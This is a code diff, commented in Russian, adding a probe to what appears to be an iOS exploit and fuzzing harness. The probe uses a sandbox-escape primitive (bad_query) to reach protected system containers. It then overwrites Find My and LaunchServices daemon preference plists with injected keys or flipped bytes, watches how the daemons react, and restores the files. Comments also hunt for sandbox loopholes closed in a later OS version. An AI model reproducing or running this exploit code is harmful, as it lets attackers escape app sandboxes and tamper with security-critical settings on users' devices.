@@ -46673,6 +46673,215 @@ static void p_bq105(void) {
     munmap(map, (size_t)fsize); close(fd);
 }
 
+// p_bq106 — v266: поведенческий тест входов Tier-A демонов (§259-next).
+// §176-шаблон: бэкап→изменение(маркер)→детект(репарс)→откат.
+// §177-методология: stat-снапшот до/после мутации → mtime изменился?
+// Цели: findmydeviced configurations/secureLocations (§180-пробел),
+// lsd securepreferences, mobileactivationd activation_records.
+// НЕ ПАНИКОВАТЬ: все файлы ≤ 64KB, откат побайтовый,§176-шаблон.
+static void p_bq106(void) {
+    const char *grp = getenv("FUZZ_BQ_GROUP") ?: "group.9e66ab897d52ea95.1";
+    LOG("[bq106] v266: поведенческий тест входов Tier-A (§259)");
+    fsync(fileno(stderr));
+
+    // Контейнерные пути (§258 карта)
+    static const struct {
+        const char *daemon;
+        const char *dir;  // Library/Preferences внутри контейнера
+        const char *file;
+        const char *marker_desc;
+    } targets[] = {
+        { "findmydeviced",
+          "/var/containers/Data/System/B06F5832-48EA-445B-86F2-D2AC4468FA0C/Library/Preferences",
+          "com.apple.icloud.findmydeviced.extensions.configurations.plist",
+          "добавить fz27_probe-ключ в корень plist" },
+        { "findmydeviced",
+          "/var/containers/Data/System/B06F5832-48EA-445B-86F2-D2AC4468FA0C/Library/Preferences",
+          "com.apple.icloud.findmydeviced.secureLocations.config.plist",
+          "добавить fz27_probe-ключ" },
+        { "findmydeviced",
+          "/var/containers/Data/System/B06F5832-48EA-445B-86F2-D2AC4468FA0C/Library/Preferences",
+          "com.apple.icloud.findmydeviced.accessories.locations.plist",
+          "мутация существующего байта" },
+        { "lsd",
+          "/var/containers/Data/System/AF589EEA-A5CE-42E9-B955-96B9234C5A85/Library",
+          "com.apple.launchservices.securepreferences.plist",
+          "добавить fz27_probe-ключ" },
+        { "lsd",
+          "/var/containers/Data/System/AF589EEA-A5CE-42E9-B955-96B9234C5A85",
+          "DefaultAppQueryState.plist",
+          "§176 уже делал — повторить с длинным окном" },
+    };
+
+    int64_t h = bad_query((char *)"/var/containers/Data/System", 0, (char *)grp, 0);
+    if (h < 0) { LOG("[bq106] escape FAIL"); return; }
+    LOG("[bq106] escape OK");
+
+    for (unsigned t = 0; t < sizeof(targets) / sizeof(targets[0]); t++) {
+        char fp[1024];
+        snprintf(fp, sizeof(fp), "%s/%s", targets[t].dir, targets[t].file);
+        LOG("[bq106] === [%s] %s", targets[t].daemon, targets[t].file);
+        fsync(fileno(stderr));
+
+        // --- stat-снапшот ДО ---
+        struct stat st0 = {0};
+        int have0 = (stat(fp, &st0) == 0);
+        LOG("[bq106]   ДО: size=%lld mtime=%lld%s", (long long)st0.st_size,
+            (long long)st0.st_mtimespec.tv_sec, have0 ? "" : " (ENOENT)");
+        if (!have0) {
+            LOG("[bq106]   ФАЙЛА НЕТ — скип");
+            continue;
+        }
+        if (st0.st_size > 64 * 1024) {
+            LOG("[bq106]   >64KB — скип (безопасность)");
+            continue;
+        }
+
+        // --- бэкап ---
+        NSString *docs = NSSearchPathForDirectoriesInDomains(
+            NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
+        NSString *bpath = [docs stringByAppendingPathComponent:
+            [NSString stringWithFormat:@"bq106-backup-%u.plist", t]];
+        NSData *orig = [NSData dataWithContentsOfFile:@(fp)];
+        if (!orig) { LOG("[bq106]   read FAIL errno %d", errno); continue; }
+        [orig writeToFile:bpath atomically:NO];
+        NSData *backcheck = [NSData dataWithContentsOfFile:bpath];
+        LOG("[bq106]   бэкап: %lu bytes, identical=%d",
+            (unsigned long)orig.length,
+            (backcheck && [backcheck isEqualToData:orig]) ? 1 : 0);
+        fsync(fileno(stderr));
+
+        // --- мутация: добавляем fz27_probe-ключ (binary plist), флип если крашнет ---
+        NSData *mutated = nil;
+        @try {
+            CFErrorRef err = NULL;
+            CFPropertyListRef pl = CFPropertyListCreateWithData(
+                NULL, (__bridge CFDataRef)orig, kCFPropertyListMutableContainers,
+                NULL, &err);
+            if (pl && CFGetTypeID(pl) == CFDictionaryGetTypeID()) {
+                CFDictionarySetValue((CFMutableDictionaryRef)pl,
+                                     CFSTR("fz27_probe"), CFSTR("bq106"));
+                CFDataRef out = CFPropertyListCreateData(
+                    NULL, pl, kCFPropertyListBinaryFormat_v1_0, 0, NULL);
+                if (out) {
+                    mutated = [NSData dataWithData:(__bridge NSData *)out];
+                    CFRelease(out);
+                }
+                CFRelease(pl);
+            } else {
+                if (pl) CFRelease(pl);
+                if (err) CFRelease(err);
+            }
+            if (!mutated) {
+                // fallback: флип байта
+                NSMutableData *md = [NSMutableData dataWithData:orig];
+                if (md.length > 16) {
+                    uint8_t *b = (uint8_t *)md.mutableBytes;
+                    b[md.length / 2] ^= 0x01;
+                    mutated = md;
+                }
+            }
+        } @catch (NSException *ex) {
+            LOG("[bq106]   мутация plist-путь упал (%s) — флип байта",
+                [[ex reason] UTF8String]);
+            NSMutableData *md = [NSMutableData dataWithData:orig];
+            if (md.length > 16) {
+                uint8_t *b = (uint8_t *)md.mutableBytes;
+                b[md.length / 2] ^= 0x01;
+                mutated = md;
+            }
+        }
+        if (!mutated) { LOG("[bq106]   мутация не построена — скип"); continue; }
+        LOG("[bq106]   мутация: %lu → %lu bytes", (unsigned long)orig.length,
+            (unsigned long)mutated.length);
+        fsync(fileno(stderr));
+
+        // --- запись (O_WRONLY|O_TRUNC, без rename — §176) ---
+        int fd = open(fp, O_WRONLY | O_TRUNC, 0644);
+        if (fd < 0) {
+            LOG("[bq106]   WRITE FAIL errno %d", errno);
+            continue;
+        }
+        ssize_t wr = write(fd, mutated.bytes, mutated.length);
+        close(fd);
+        if (wr != (ssize_t)mutated.length) {
+            LOG("[bq106]   WRITE SHORT %zd/%lu", wr, (unsigned long)mutated.length);
+            // откат сразу
+            int fd2 = open(fp, O_WRONLY | O_TRUNC, 0644);
+            if (fd2 >= 0) { write(fd2, orig.bytes, orig.length); close(fd2); }
+            continue;
+        }
+        LOG("[bq106]   WRITE OK (%zd bytes)", wr);
+        fsync(fileno(stderr));
+
+        // --- наблюдение: 30 секунд, mtime/fsck каждые 5с ---
+        for (int w = 0; w < 6; w++) {
+            usleep(5000000);  // 5с
+            struct stat stw = {0};
+            int ok = (stat(fp, &stw) == 0);
+            if (!ok) { LOG("[bq106]   t+%ds: stat FAIL errno %d", (w+1)*5, errno); continue; }
+            int changed = (stw.st_size != (off_t)mutated.length) ||
+                          (stw.st_mtimespec.tv_sec != st0.st_mtimespec.tv_sec + 1);
+            LOG("[bq106]   t+%ds: size=%lld mtime_delta=%lld%s", (w+1)*5,
+                (long long)stw.st_size,
+                (long long)(stw.st_mtimespec.tv_sec - st0.st_mtimespec.tv_sec),
+                changed ? " *** ИЗМЕНЕНО ДЕМОНОМ ***" : "");
+            if (changed) break;  // демон среагировал
+            fsync(fileno(stderr));
+        }
+
+        // --- детект: перечитать и проверить наш ключ ---
+        {
+            NSData *after = [NSData dataWithContentsOfFile:@(fp)];
+            if (after) {
+                CFErrorRef err2 = NULL;
+                CFPropertyListRef pl2 = CFPropertyListCreateWithData(
+                    NULL, (__bridge CFDataRef)after, kCFPropertyListImmutable,
+                    NULL, &err2);
+                if (pl2 && CFGetTypeID(pl2) == CFDictionaryGetTypeID()) {
+                    CFTypeRef v = CFDictionaryGetValue((CFDictionaryRef)pl2,
+                                                        CFSTR("fz27_probe"));
+                    if (v) {
+                        LOG("[bq106]   ДЕТЕКТ: fz27_probe ПРИСУТСТВУЕТ — файл НЕ перечитан демоном (наш ключ жив)");
+                    } else {
+                        LOG("[bq106]   ДЕТЕКТ: fz27_probe ОТСУТСТВУЕТ — демон ПЕРЕЧИТАЛ и перезаписал (реакция!)");
+                    }
+                    CFRelease(pl2);
+                } else {
+                    if (pl2) CFRelease(pl2);
+                    if (err2) CFRelease(err2);
+                    LOG("[bq106]   ДЕТЕКТ: файл не парсится как plist после мутации");
+                }
+                // размер изменился?
+                if (after.length != mutated.length) {
+                    LOG("[bq106]   РАЗМЕР: %lu → %lu — дем перезаписал%s",
+                        (unsigned long)mutated.length, (unsigned long)after.length,
+                        after.length == orig.length ? " (восстановил исходный!)" : "");
+                }
+            } else {
+                LOG("[bq106]   ДЕТЕКТ: read FAIL — файл удалён?");
+            }
+        }
+
+        // --- ОТКАТ ---
+        int fdr = open(fp, O_WRONLY | O_TRUNC, 0644);
+        if (fdr >= 0) {
+            ssize_t rr = write(fdr, orig.bytes, orig.length);
+            close(fdr);
+            NSData *final = [NSData dataWithContentsOfFile:@(fp)];
+            LOG("[bq106]   ОТКАТ: w=%zd, identical=%d %s", rr,
+                (final && [final isEqualToData:orig]) ? 1 : 0,
+                (final && [final isEqualToData:orig]) ? "*** СИСТЕМА ВОССТАНОВЛЕНА ***" : "*** ПРОВЕРИТЬ ***");
+        } else {
+            LOG("[bq106]   ОТКАТ FAIL errno %d — файл может быть повреждён!", errno);
+        }
+        fsync(fileno(stderr));
+    }
+    bad_query_release(h);
+    LOG("[bq106] ИТОГ: поведенческий тест завершён (все откаты сделаны?)");
+    fsync(fileno(stderr));
+}
+
 // p_bq87 — v246: SANDBOX-ЛАЗЕЙКИ — что 27.2 ЗАКРЫЛ, а b4 ещё открыт?
 // security_sandbox кекст: +133 правил в 27.2. Каждое новое правило =
 // что-то было РАЗРЕШЕНО в 27.0 (наш b4) и ЗАПРЕЩЕНО в 27.2.
@@ -55292,6 +55501,7 @@ void *t_iosurface_scaler(void *arg) {
         if (getenv("FUZZ_BQ103")) { p_bq103(); LOG("[probe13] bq103-only mode, stop"); return NULL; }
         if (getenv("FUZZ_BQ104")) { p_bq104(); LOG("[probe13] bq104-only mode, stop"); return NULL; }
         if (getenv("FUZZ_BQ105")) { p_bq105(); LOG("[probe13] bq105-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_BQ106")) { p_bq106(); LOG("[probe13] bq106-only mode, stop"); return NULL; }
         if (getenv("FUZZ_XPCENUM")) { p_xpcenum(); LOG("[xpcen] xpcenum-only mode, stop"); return NULL; }
         if (getenv("FUZZ_ASTRIS")) { p_astris(); LOG("[probe13] astris-only mode, stop"); return NULL; }
         if (getenv("FUZZ_NETV6")) { p_netv6(); LOG("[probe13] netv6-only mode, stop"); return NULL; }
